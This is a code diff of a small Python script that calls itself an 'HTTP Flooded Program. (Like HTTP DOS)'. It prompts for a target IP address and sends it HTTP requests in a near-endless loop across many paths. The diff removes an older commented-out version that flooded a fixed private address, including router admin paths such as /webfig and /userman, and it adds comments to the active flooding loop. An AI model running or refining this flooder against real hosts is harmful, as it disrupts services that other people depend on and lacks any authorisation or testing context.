@@ -1,23 +1,3 @@
-"""
-# ================== Old Code =============
-import requests
-
-for i in range(10000000000000):
-    r = requests.get("http://192.168.43.93")
-    #print(f"Status code = {r.status_code}")        # print status code only
-    s = requests.get("http://192.168.43.93/hi")
-    t = requests.get("http://192.168.43.93/ha")
-    u = requests.get("http://192.168.43.93/hmm")
-    v = requests.get("http://192.168.43.93/webfig")
-    a = requests.get("http://192.168.43.93/webfig1")
-    b = requests.get("http://192.168.43.93/webfi1g")
-    c = requests.get("http://192.168.43.93/userman")
-
-    for x in r,s,t,u,v,a,b,c:   # print as list
-        print("Status code = ", x)
-
-"""
-
 # Python code to pick a random
 # word from a text file
 import random
@@ -49,10 +29,13 @@ liststr = ['a','b','c','d','e','f',
 
 print("======== HTTP Flooded Program. (Like HTTP DOS) =========\n")
 ipaddr = str(input("Input ip address : "))
+
+# Execute
 for i in range (10000000000000000):
     for number, letter in enumerate(liststr):
         #req = requests.get("http://192.168.122.146/"+ letter)
         req = requests.get("http://" + ipaddr + "/"+ letter)
 
+        # print status code
         for status_code in req:
             print("Status code = ", status_code)
